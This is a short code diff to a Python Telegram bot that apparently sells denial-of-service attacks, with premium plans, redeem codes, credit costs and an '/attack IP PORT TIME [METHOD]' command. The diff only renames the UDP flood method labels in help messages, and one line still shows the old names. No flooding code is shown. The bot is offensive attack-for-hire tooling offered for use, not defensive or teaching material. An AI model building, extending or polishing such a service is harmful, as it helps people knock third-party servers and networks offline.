@@ -904,8 +904,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Plan: {plan_display}\n"
         f"⚡ Status: {active_text}\n\n"
         f"📡 *Methods:*\n"
-        f"• ALEX-BIG (4c)\n"
-        f"• ALEX-Gbps (2c)\n\n"
+        f"• UDP-BIG (4c)\n"
+        f"• UDP-Gbps (2c)\n\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n\n"
         f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME [METHOD]'}"
     )
@@ -935,8 +935,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
             "Examples:\n"
-            "`/attack 1.2.3.4 80 60` (ALEX-BIG, 4c)\n"
-            "`/attack 1.2.3.4 80 60 ALEX-Gbps` (2c)\n\n"
+            "`/attack 1.2.3.4 80 60` (UDP-BIG, 4c)\n"
+            "`/attack 1.2.3.4 80 60 UDP-Gbps` (2c)\n\n"
             f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION}s\n"
             "📡 Methods: ALEX-BIG (4c), ALEX-Gbps (2c)",
             parse_mode='Markdown',
